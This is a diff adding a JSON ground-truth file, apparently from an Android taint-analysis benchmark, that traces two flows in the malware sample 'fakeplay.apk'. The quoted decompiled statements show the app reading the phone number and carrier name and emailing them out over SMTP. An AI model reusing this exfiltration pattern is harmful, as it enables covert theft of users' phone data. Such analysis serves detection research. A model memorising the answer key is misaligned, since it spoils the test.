@@ -1,0 +1,332 @@
+{
+  "fileName": "fakeplay.apk",
+  "day": "2019-08-08",
+  "findings": [
+    {
+      "source": {
+        "statement": "String networkName = manager.getNetworkOperatorName();",
+        "methodName": "public void smsReceived(Intent intent)",
+        "className": "com.googleprojects.mm.JHService",
+        "lineNo": 124,
+        "targetName": "getNetworkOperatorName",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r14 = virtualinvoke $r12.<android.telephony.TelephonyManager: java.lang.String getNetworkOperatorName()>()"
+          }
+        ]
+      },
+      "sink": {
+        "statement": "os.write(data, 0, bytes_read);",
+        "methodName": "public void writeTo(OutputStream os)",
+        "className": "javax.activation.DataHandler",
+        "lineNo": 322,
+        "targetName": "write",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "virtualinvoke $r1.<java.io.OutputStream: void write(byte[],int,int)>($r2, 0, $i0)"
+          }
+        ]
+      },
+      "intermediateFlows": [
+        {
+          "statement": "networkName = manager.getSimOperatorName();",
+          "methodName": "public void smsReceived(Intent intent)",
+          "className": "com.googleprojects.mm.JHService",
+          "lineNo": 126,
+          "ID": 1
+        },
+        {
+          "statement": "networkName = manager.getSimOperator();",
+          "methodName": "public void smsReceived(Intent intent)",
+          "className": "com.googleprojects.mm.JHService",
+          "lineNo": 129,
+          "ID": 2
+        },
+        {
+          "statement": "new MMMailSender(this.currentMail.sender_addr, SOMailCPUtil.mail_pwd, this.currentMail.smtp_addr, this.currentMail.smtp_port).sendMail(MMMailContentUtil.MM_MESSAGE_SUBJECT, MMMailContentUtil.makeMMMessageBody(userPhone, networkName, MMMailContentUtil.MM_MESSAGE_SUBJECT, addr, msgBody, this.dataManager.isEnabled(), VERSION.RELEASE), this.currentMail.sender_addr, this.currentMail.receiver_addr);",
+          "methodName": "public void smsReceived(Intent intent)",
+          "className": "com.googleprojects.mm.JHService",
+          "lineNo": 139,
+          "ID": 3
+        },
+        {
+          "statement": " return new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(MM_MESSAGE_SUBJECT + phoneNum + \",\" + netName + \",\" + deviceToken + \",\" + (isOn ? \"1\" : \"0\") + \",\")).append(MM_MESSAGE_SUBJECT).append(\",\").append(fromNum).append(\",\").toString())).append(msgBody).toString();",
+          "methodName": "public static String makeMMMessageBody(String phoneNum, String netName, String deviceToken, String fromNum, String msgBody, boolean isOn, String versionCode)",
+          "className": "com.googleprojects.mm.MMMailContentUtil",
+          "lineNo": 22,
+          "ID": 4
+        },
+        {
+          "statement": "DataHandler handler = new DataHandler(new ByteArrayDataSource(body.getBytes(), \"text/plain\"));",
+          "methodName": "public synchronized void sendMail(String subject, String body, String sender, String recipients)",
+          "className": "com.googleprojects.mm.MMMailSender",
+          "lineNo": 53,
+          "ID": 5
+        },
+        {
+          "statement": "this.data = data;",
+          "methodName": "public ByteArrayDataSource(byte[] data, String type)",
+          "className": "com.googleprojects.mm.MMMailSender$ByteArrayDataSource",
+          "lineNo": 71,
+          "ID": 6
+        },
+        {
+          "statement": "this.dataSource = ds;",
+          "methodName": "public DataHandler(DataSource ds)",
+          "className": "javax.activation.DataHandler",
+          "lineNo": 129,
+          "ID": 7
+        },
+        {
+          "statement": "message.setDataHandler(handler);",
+          "methodName": "public synchronized void sendMail(String subject, String body, String sender, String recipients)",
+          "className": "com.googleprojects.mm.MMMailSender",
+          "lineNo": 56,
+          "ID": 8
+        },
+        {
+          "statement": "this.dh = dh;",
+          "methodName": "public Object getContent()",
+          "className": "javax.mail.internet.MimeMessage",
+          "lineNo": 1425,
+          "ID": 9
+        },
+        {
+          "statement": "Transport.send(message);",
+          "methodName": "public synchronized void sendMail(String subject, String body, String sender, String recipients)",
+          "className": "com.googleprojects.mm.MMMailSender",
+          "lineNo": 61,
+          "ID": 10
+        },
+        {
+          "statement": "send0(msg, msg.getAllRecipients());",
+          "methodName": "public static void send(Message msg)",
+          "className": "javax.mail.Transport",
+          "lineNo": 118,
+          "ID": 11
+        },
+        {
+          "statement": "transport.sendMessage(msg, addresses);",
+          "methodName": "private static void send0(Message msg, Address[] addresses)",
+          "className": "javax.mail.Transport",
+          "lineNo": 189,
+          "ID": 12
+        },
+        {
+          "statement": "this.message.writeTo(data(), ignoreList);",
+          "methodName": "public synchronized void sendMessage(Message message, Address[] addresses)",
+          "className": "com.sun.mail.smtp.SMTPTransport",
+          "lineNo": 636,
+          "ID": 13
+        },
+        {
+          "statement": "MimeBodyPart.writeTo(this, os, ignoreList);",
+          "methodName": "public void writeTo(OutputStream os, String[] ignoreList)",
+          "className": "javax.mail.internet.MimeMessage",
+          "lineNo": 1745,
+          "ID": 14
+        },
+        {
+          "statement": "part.getDataHandler().writeTo(os);",
+          "methodName": "static void writeTo(MimePart part, OutputStream os, String[] ignoreList)",
+          "className": "javax.mail.internet.MimeBodyPart",
+          "lineNo": 1403,
+          "ID": 15
+        },
+        {
+          "statement": "return this.dh;",
+          "methodName": "public DataHandler getDataHandler()",
+          "className": "javax.mail.internet.MimeBodyPart",
+          "lineNo": 623,
+          "ID": 16
+        },
+        {
+          "statement": "InputStream is = this.dataSource.getInputStream();",
+          "methodName": "public void writeTo(OutputStream os)",
+          "className": "javax.activation.DataHandler",
+          "lineNo": 318,
+          "ID": 17
+        },
+        {
+          "statement": "int bytes_read = is.read(data);",
+          "methodName": "public void writeTo(OutputStream os)",
+          "className": "javax.activation.DataHandler",
+          "lineNo": 321,
+          "ID": 18
+        }
+      ],
+      "attributes": {
+        "appendToString": true,
+        "nonStaticField": true,
+        "pathConstraints": true
+      },
+      "ID": 1,
+      "description": "This malicious flow leaks telephoney network information via email.",
+      "isNegative": false
+    },
+    {
+      "source": {
+        "statement": "String userPhone = manager.getLine1Number();",
+        "methodName": "public void onCreate(Bundle savedInstanceState)",
+        "className": "com.googleprojects.mm.SPMainActivity",
+        "lineNo": 97,
+        "targetName": "getLine1Number",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r17 = virtualinvoke $r16.<android.telephony.TelephonyManager: java.lang.String getLine1Number()>()"
+          }
+        ]
+      },
+      "sink": {
+        "statement": "os.write(data, 0, bytes_read);",
+        "methodName": "public void writeTo(OutputStream os)",
+        "className": "javax.activation.DataHandler",
+        "lineNo": 322,
+        "targetName": "write",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "virtualinvoke $r1.<java.io.OutputStream: void write(byte[],int,int)>($r2, 0, $i0)"
+          }
+        ]
+      },
+      "intermediateFlows": [
+        {
+          "statement": "String mailBody = MMMailContentUtil.makeMMMessageBody(userPhone, networkName, MMMailContentUtil.MM_MESSAGE_SUBJECT, MMMailContentUtil.MM_MESSAGE_SUBJECT, MMMailContentUtil.MM_MESSAGE_SUBJECT, false, VERSION.RELEASE);",
+          "methodName": "public void onCreate(Bundle savedInstanceState)",
+          "className": "com.googleprojects.mm.SPMainActivity",
+          "lineNo": 117,
+          "ID": 1
+        },
+        {
+          "statement": "new MMMailSender(this.currentMail.sender_addr, SOMailCPUtil.mail_pwd, this.currentMail.smtp_addr, this.currentMail.smtp_port).sendMail(MMMailContentUtil.MM_MESSAGE_SUBJECT, mailBody, this.currentMail.sender_addr, this.currentMail.receiver_addr);",
+          "methodName": "public void onCreate(Bundle savedInstanceState)",
+          "className": "com.googleprojects.mm.SPMainActivity",
+          "lineNo": 138,
+          "ID": 2
+        },
+        {
+          "statement": " return new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(MM_MESSAGE_SUBJECT + phoneNum + \",\" + netName + \",\" + deviceToken + \",\" + (isOn ? \"1\" : \"0\") + \",\")).append(MM_MESSAGE_SUBJECT).append(\",\").append(fromNum).append(\",\").toString())).append(msgBody).toString();",
+          "methodName": "public static String makeMMMessageBody(String phoneNum, String netName, String deviceToken, String fromNum, String msgBody, boolean isOn, String versionCode)",
+          "className": "com.googleprojects.mm.MMMailContentUtil",
+          "lineNo": 22,
+          "ID": 3
+        },
+        {
+          "statement": "DataHandler handler = new DataHandler(new ByteArrayDataSource(body.getBytes(), \"text/plain\"));",
+          "methodName": "public synchronized void sendMail(String subject, String body, String sender, String recipients)",
+          "className": "com.googleprojects.mm.MMMailSender",
+          "lineNo": 53,
+          "ID": 4
+        },
+        {
+          "statement": "this.data = data;",
+          "methodName": "public ByteArrayDataSource(byte[] data, String type)",
+          "className": "com.googleprojects.mm.MMMailSender$ByteArrayDataSource",
+          "lineNo": 71,
+          "ID": 5
+        },
+        {
+          "statement": "this.dataSource = ds;",
+          "methodName": "public DataHandler(DataSource ds)",
+          "className": "javax.activation.DataHandler",
+          "lineNo": 129,
+          "ID": 6
+        },
+        {
+          "statement": "message.setDataHandler(handler);",
+          "methodName": "public synchronized void sendMail(String subject, String body, String sender, String recipients)",
+          "className": "com.googleprojects.mm.MMMailSender",
+          "lineNo": 56,
+          "ID": 7
+        },
+        {
+          "statement": "this.dh = dh;",
+          "methodName": "public synchronized void setDataHandler(DataHandler dh)",
+          "className": "javax.mail.internet.MimeMessage",
+          "lineNo": 1425,
+          "ID": 8
+        },
+        {
+          "statement": "Transport.send(message);",
+          "methodName": "public synchronized void sendMail(String subject, String body, String sender, String recipients)",
+          "className": "com.googleprojects.mm.MMMailSender",
+          "lineNo": 61,
+          "ID": 9
+        },
+        {
+          "statement": "send0(msg, msg.getAllRecipients());",
+          "methodName": "public static void send(Message msg)",
+          "className": "javax.mail.Transport",
+          "lineNo": 118,
+          "ID": 10
+        },
+        {
+          "statement": "transport.sendMessage(msg, addresses);",
+          "methodName": "private static void send0(Message msg, Address[] addresses)",
+          "className": "javax.mail.Transport",
+          "lineNo": 189,
+          "ID": 11
+        },
+        {
+          "statement": "this.message.writeTo(data(), ignoreList);",
+          "methodName": "public synchronized void sendMessage(Message message, Address[] addresses)",
+          "className": "com.sun.mail.smtp.SMTPTransport",
+          "lineNo": 636,
+          "ID": 12
+        },
+        {
+          "statement": "MimeBodyPart.writeTo(this, os, ignoreList);",
+          "methodName": "public void writeTo(OutputStream os, String[] ignoreList)",
+          "className": "javax.mail.internet.MimeMessage",
+          "lineNo": 1745,
+          "ID": 13
+        },
+        {
+          "statement": "part.getDataHandler().writeTo(os);",
+          "methodName": "static void writeTo(MimePart part, OutputStream os, String[] ignoreList)",
+          "className": "javax.mail.internet.MimeBodyPart",
+          "lineNo": 1403,
+          "ID": 14
+        },
+        {
+          "statement": "return this.dh;",
+          "methodName": "public DataHandler getDataHandler()",
+          "className": "javax.mail.internet.MimeBodyPart",
+          "lineNo": 623,
+          "ID": 15
+        },
+        {
+          "statement": "InputStream is = this.dataSource.getInputStream();",
+          "methodName": "public void writeTo(OutputStream os)",
+          "className": "javax.activation.DataHandler",
+          "lineNo": 318,
+          "ID": 16
+        },
+        {
+          "statement": "int bytes_read = is.read(data);",
+          "methodName": "public void writeTo(OutputStream os)",
+          "className": "javax.activation.DataHandler",
+          "lineNo": 321,
+          "ID": 17
+        }
+      ],
+      "attributes": {
+        "appendToString": true,
+        "lifecycle": true,
+        "nonStaticField": true,
+        "pathConstraints": true
+      },
+      "ID": 2,
+      "description": "This malicious flow leaks telephone number via email.",
+      "isNegative": false
+    }
+  ]
+}
